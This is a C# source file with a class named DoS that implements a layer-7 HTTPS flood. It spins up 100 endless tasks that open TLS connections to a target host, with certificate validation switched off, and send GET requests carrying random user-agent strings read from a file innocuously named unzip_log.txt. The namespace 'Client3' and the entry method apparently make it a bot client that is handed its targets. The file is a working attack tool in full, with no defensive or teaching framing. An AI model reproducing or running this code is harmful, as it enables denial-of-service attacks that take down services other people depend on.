using System.Collections.Generic;
using System;
using System.Net.Http;
using System.Text;
using System;
using System.IO;
using System.Net.Security;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;  

namespace Client3
{

    class DoS
    {
        public void Final(string host, string path)
        {
            new Thread(() => Run(host, path)).Start();
        }

        public void Run(string host, string path)   
        {
            LoadList();

            for (int i = 0; i < 100; i++)
            {
                Task.Run(() => Flood(host, path));
                Thread.Sleep(10);

            }
            Thread.Sleep(-1);
        }

        private List<string> _userAgens = new List<string>();

        private string _user = Environment.UserName;

        public void Flood(string host, string path)
        {
            while (true)
            {
                try
                {
                    var client = new TcpClient();
                    client.Connect(host, 443);

                    using (SslStream ssl = new SslStream(client.GetStream(), false, (sender, cert, chain, errors) => true))
                    {
                        ssl.AuthenticateAsClient(host);

                        string userAg = ReturnRandom();
                        string httpRequest =
                                $"GET {path} HTTP/1.1\r\n" +
                                $"Host: {host}\r\n" +
                                $"User-Agent: {userAg}\r\n" +
                                $"Connection: keep-alive\r\n" +
                                $"Accept: */*\r\n\r\n";

                        var data = Encoding.ASCII.GetBytes(httpRequest);
                        ssl.Write(data, 0, data.Length);

                        Thread.Sleep(100);

                    }
                }
                catch
                {

                }
            }
        }


        public void LoadList()
        {
            var pathToHeader = $"C:\\Users\\{_user}\\Documents\\unzip_log.txt";
            var lines = File.ReadAllLines(pathToHeader);


            foreach (var line in lines)
            {
                _userAgens.Add(line);
            }

        }

        public string ReturnRandom()
        {
            Random random = new Random();

            int randPos = random.Next(_userAgens.Count);

            return _userAgens[randPos];
        }

    }
}
